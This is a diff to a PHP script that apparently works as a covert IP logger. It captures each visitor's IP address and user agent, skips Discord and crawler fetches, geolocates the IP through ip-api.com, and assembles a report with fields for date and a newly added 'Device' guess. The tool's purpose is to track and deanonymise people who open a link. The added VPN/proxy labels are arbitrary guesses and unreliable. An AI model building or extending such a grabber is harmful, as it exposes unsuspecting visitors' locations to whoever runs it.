@@ -2,12 +2,15 @@
 
 if(!empty($_SERVER['HTTP_CLIENT_IP'])){
     $USERIP=$_SERVER['HTTP_CLIENT_IP'];
+    $DEVICE="NO VPN OR PROXY(guess)";
   }
   elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
     $USERIP=$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $DEVICE="VPN(guess)";
   }
   else{
     $USERIP=$_SERVER['REMOTE_ADDR'];
+    $DEVICE="PROXY(guess)";
   }
 
 $Broseraaa = $_SERVER["HTTP_USER_AGENT"];
@@ -24,7 +27,12 @@ if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Broseraaa)) {
 // initialize curl(what is curl? don't even know but I know it allows me to process data from an api)
 $curl = curl_init();
 echo $USERIP;
-$curl = curl_init("http://ip-api.com/json/$USERIP"); //Get the info of the IP using Curl
+if ($USERIP == "::1") {
+    $curl = curl_init("http://ip-api.com/json/");
+} else {
+    $curl = curl_init("http://ip-api.com/json/$USERIP");
+};
+ //Get the info of the IP using Curl
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
 
 //actually exectuting it shit cuh
@@ -91,6 +99,11 @@ $POST = [
                 [
                     "name" => "Date: ",
                     "value" => "$TIMESTAMP seconds",
+                    "inline" => false
+                ],
+                [
+                    "name" => "Device: ",
+                    "value" => "$DEVICE",
                     "inline" => false
                 ]
             ]
